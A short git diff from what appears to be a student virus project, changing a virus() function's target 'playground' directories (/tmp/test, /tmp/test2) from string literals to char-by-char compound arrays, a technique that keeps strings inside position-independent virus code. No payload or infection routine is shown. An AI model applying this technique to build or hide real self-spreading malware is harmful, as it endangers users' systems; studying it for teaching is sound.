@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 00:21:46 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/04 03:53:01 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 04:03:42 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,8 +19,8 @@ void	virus()
 {
 	const char *playgrounds[] =
 	{
-		"/tmp/test",
-		"/tmp/test2"
+		(char[10]){'/','t','m','p','/','t','e','s','t','\0'},
+		(char[11]){'/','t','m','p','/','t','e','s','t','2','\0'}
 	};
 
 	for (size_t i = 0; i < ARRAY_SIZE(playgrounds); i++)
